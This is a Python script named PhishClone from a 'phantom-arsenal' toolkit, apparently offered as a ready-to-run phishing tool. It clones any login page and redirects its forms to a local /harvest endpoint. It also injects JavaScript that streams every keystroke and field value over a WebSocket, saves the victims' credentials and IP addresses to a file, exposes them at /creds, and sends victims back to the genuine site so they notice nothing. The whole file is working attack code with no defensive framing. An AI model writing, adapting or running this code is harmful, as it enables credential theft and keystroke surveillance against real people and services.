#!/usr/bin/env python3
"""
phantom-arsenal / PhishClone
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Clone any login page → serve locally → harvest credentials + IP
Live keystroke logging via WebSocket
"""

import sys, os, re, json, datetime, threading, urllib.request, urllib.parse
import http.server, socketserver
try:
    import websockets, asyncio
    WS = True
except ImportError:
    WS = False

CREDS_FILE = "captured_creds.json"
LOG_FILE   = "keystrokes.log"
PORT       = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
WS_PORT    = PORT + 1

BANNER = r"""
\033[96m
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗ ██████╗██╗      ██████╗ ███╗   ██╗███████╗
██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██║     ██╔═══██╗████╗  ██║██╔════╝
██████╔╝███████║██║███████╗███████║██║     ██║     ██║   ██║██╔██╗ ██║█████╗  
██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║     ██║     ██║   ██║██║╚██╗██║██╔══╝  
██║     ██║  ██║██║███████║██║  ██║╚██████╗███████╗╚██████╔╝██║ ╚████║███████╗
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
                    phantom-arsenal — PhishClone v2.0
\033[0m"""

def fetch(url):
    req = urllib.request.Request(url, headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0',
        'Accept': 'text/html,application/xhtml+xml,*/*',
        'Accept-Language': 'en-US,en;q=0.9',
    })
    with urllib.request.urlopen(req, timeout=15) as r:
        charset = r.headers.get_param('charset') or 'utf-8'
        return r.read().decode(charset, errors='replace'), r.geturl()

def rewrite(html, base_url):
    p = urllib.parse.urlparse(base_url)
    base = f"{p.scheme}://{p.netloc}"

    def abs_url(m):
        attr, q, v = m.group(1), m.group(2), m.group(3)
        if v.startswith(('http','data:','#','javascript:','mailto:','tel:')):
            return m.group(0)
        if v.startswith('//'): return f'{attr}={q}{p.scheme}:{v}{q}'
        if v.startswith('/'): return f'{attr}={q}{base}{v}{q}'
        return f'{attr}={q}{base}/{v}{q}'

    html = re.sub(r'(src|href)=(["\'])([^"\'> ]+)\2', abs_url, html, flags=re.I)

    # redirect all form actions to /harvest
    html = re.sub(r'(<form[^>]*)\s+action=["\'][^"\']*["\']', r'\1 action="/harvest"', html, flags=re.I)
    html = re.sub(r'(<form)(?![^>]*action=)([^>]*>)', r'\1 action="/harvest"\2', html, flags=re.I)
    html = re.sub(r'(<form[^>]*)\s+method=["\']get["\']', r'\1 method="POST"', html, flags=re.I)

    inject = f"""
<script>
(function(){{
  var WS_PORT = {WS_PORT};
  var ws;
  function connectWS(){{
    try{{
      ws = new WebSocket('ws://'+location.hostname+':'+WS_PORT);
      ws.onclose = function(){{ setTimeout(connectWS,2000); }};
    }}catch(e){{}}
  }}
  connectWS();

  function send(type, data){{
    if(ws && ws.readyState===1) ws.send(JSON.stringify({{type:type,data:data,ts:new Date().toISOString()}}));
  }}

  // Live keystrokes
  document.addEventListener('keyup', function(e){{
    var t = e.target;
    send('keystroke', {{
      key: e.key,
      field: t.name||t.id||t.placeholder||t.type||'unknown',
      value: t.value
    }});
  }}, true);

  // Intercept form submit
  document.addEventListener('submit', function(e){{
    e.preventDefault();
    var f = e.target;
    var data = {{}};
    new FormData(f).forEach(function(v,k){{ data[k]=v; }});
    send('submit', data);
    fetch('/harvest',{{
      method:'POST',
      headers:{{'Content-Type':'application/json'}},
      body: JSON.stringify(data)
    }}).then(function(){{ window.location='{base_url}'; }});
  }}, true);

  // Intercept XHR/fetch login buttons
  document.addEventListener('click', function(e){{
    var el = e.target;
    if(el && (el.type==='submit'||el.tagName==='BUTTON'||
              (el.tagName==='A' && (el.text||'').toLowerCase().includes('login')))){
      var inputs = document.querySelectorAll('input');
      var data = {{}};
      inputs.forEach(function(i){{
        if(i.value) data[i.name||i.id||i.type] = i.value;
      }});
      if(Object.keys(data).length) send('click_harvest', data);
    }}
  }}, true);
}})();
</script>
</body>"""

    html = re.sub(r'</body>', inject, html, flags=re.I) if re.search(r'</body>', html, re.I) else html + inject
    return html

# ── WebSocket server ─────────────────────────────────────────────────────────
async def ws_handler(ws):
    client = ws.remote_address[0] if hasattr(ws,'remote_address') else '?'
    async for msg in ws:
        try:
            d = json.loads(msg)
            t = d.get('type','')
            if t == 'keystroke':
                ks = d['data']
                line = f"[KEYSTROKE] field={ks.get('field','?')} key={ks.get('key','?')} value={ks.get('value','')}"
                print(f"\033[93m{line}\033[0m")
                with open(LOG_FILE,'a') as f: f.write(line+'\n')
            elif t in ('submit','click_harvest'):
                line = f"[{t.upper()}] {json.dumps(d['data'], ensure_ascii=False)}"
                print(f"\033[92m{line}\033[0m")
                with open(LOG_FILE,'a') as f: f.write(line+'\n')
        except: pass

def start_ws():
    if not WS: return
    async def _run():
        async with websockets.serve(ws_handler, "0.0.0.0", WS_PORT):
            await asyncio.Future()
    asyncio.run(_run())

# ── HTTP server ───────────────────────────────────────────────────────────────
class Handler(http.server.BaseHTTPRequestHandler):
    html = ""; target = ""
    def log_message(self,*a): pass

    def do_GET(self):
        if self.path == '/':
            self._ok('text/html', self.html.encode())
        elif self.path == '/creds':
            try:
                with open(CREDS_FILE) as f: data = f.read().encode()
            except: data = b'[]'
            self._ok('application/json', data)
        else:
            self.send_response(404); self.end_headers()

    def do_POST(self):
        if self.path == '/harvest':
            n = int(self.headers.get('Content-Length',0))
            body = self.rfile.read(n).decode('utf-8','replace')
            try: data = json.loads(body)
            except: data = dict(urllib.parse.parse_qsl(body))

            ip = self.client_address[0]
            entry = {
                "time": datetime.datetime.now().isoformat(),
                "ip": ip,
                "target": self.target,
                "credentials": data
            }
            creds = []
            try:
                with open(CREDS_FILE) as f: creds = json.load(f)
            except: pass
            creds.append(entry)
            with open(CREDS_FILE,'w') as f:
                json.dump(creds, f, indent=2, ensure_ascii=False)

            print(f"\n\033[41m\033[97m [CAPTURED] IP={ip} → {json.dumps(data,ensure_ascii=False)} \033[0m\n")
            self._ok('application/json', b'{"ok":true}')
        else:
            self.send_response(404); self.end_headers()

    def _ok(self, ct, body):
        self.send_response(200)
        self.send_header('Content-Type', ct)
        self.send_header('Content-Length', len(body))
        self.end_headers()
        self.wfile.write(body)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 phisher.py <URL> [port]")
        sys.exit(1)

    print(BANNER)
    url = sys.argv[1]
    print(f"\033[96m[*] Target   : {url}\033[0m")
    print(f"\033[96m[*] Fetching page...\033[0m")

    html, final = fetch(url)
    cloned = rewrite(html, final)

    Handler.html   = cloned
    Handler.target = final

    print(f"\033[92m[+] Cloned   : {len(cloned):,} bytes\033[0m")

    # start WebSocket thread
    if WS:
        t = threading.Thread(target=start_ws, daemon=True)
        t.start()
        print(f"\033[92m[+] WebSocket: ws://0.0.0.0:{WS_PORT} (live keystrokes)\033[0m")
    else:
        print(f"\033[93m[!] pip install websockets  →  for live keystrokes\033[0m")

    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), Handler) as srv:
        print(f"\033[92m[+] Phishing : http://0.0.0.0:{PORT}\033[0m")
        print(f"\033[92m[+] Creds    : http://0.0.0.0:{PORT}/creds\033[0m")
        print(f"\033[92m[+] Log file : {LOG_FILE}\033[0m")
        print(f"\033[93m[*] Waiting for victims...\033[0m\n")
        try:
            srv.serve_forever()
        except KeyboardInterrupt:
            print("\n\033[91m[!] Stopped\033[0m")
            try:
                with open(CREDS_FILE) as f:
                    c = json.load(f)
                print(f"\033[92m[+] Total captured: {len(c)}\033[0m")
                for x in c:
                    print(f"  ► {x['time']} | IP={x['ip']} | {x['credentials']}")
            except: print("[*] No credentials captured")

if __name__ == '__main__':
    main()
